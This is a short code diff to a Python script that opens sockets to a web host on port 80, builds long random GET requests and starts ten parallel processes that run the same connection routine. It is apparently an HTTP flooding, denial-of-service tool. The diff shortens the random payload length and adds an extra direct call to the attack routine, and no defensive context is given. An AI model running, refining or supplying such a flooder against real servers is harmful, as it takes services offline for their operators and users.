@@ -13,7 +13,7 @@ def connect():
             PORT = 80
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((HOST, PORT))
-            N = 100000
+            N = 10000
             ptr = string.ascii_uppercase + string.digits
             ptr += "!@#$%^&*()_+`-~"
             request = 'GET /'
@@ -35,6 +35,7 @@ def connect():
 if __name__ == '__main__':
     multiprocessing.freeze_support()
     processes = []
+    connect()
     for i in range(10):
         processes.append(multiprocessing.Process(
             target=connect,
